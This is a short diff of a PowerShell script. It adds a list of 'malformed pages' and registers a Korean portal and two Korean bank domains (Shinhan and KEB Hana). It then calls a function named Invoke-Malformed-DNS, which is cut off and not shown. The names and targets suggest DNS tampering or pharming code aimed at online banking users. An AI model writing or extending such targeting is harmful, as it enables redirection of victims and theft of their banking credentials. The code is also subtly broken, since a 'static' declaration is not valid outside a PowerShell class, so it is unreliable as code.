@@ -18,9 +18,13 @@ function Invoke-Malformed-DNS
     }   
 }
 
-function Register-Malformed-Page($PageUrl)
+static [System.Collections.Generic.List[String]] $malformedPages = New-Object System.Collections.Generic.List[String]
+function Register-MalformedPage([String] $PageUrl)
 {
-
+    $malformedPages.Add($PageUrl)
 }
 
+Register-MalformedPage("www.naver.com")
+Register-MalformedPage("bank.shinhan.com")
+Register-MalformedPage("www.kebhana.com")
 Invoke-Malformed-DNS
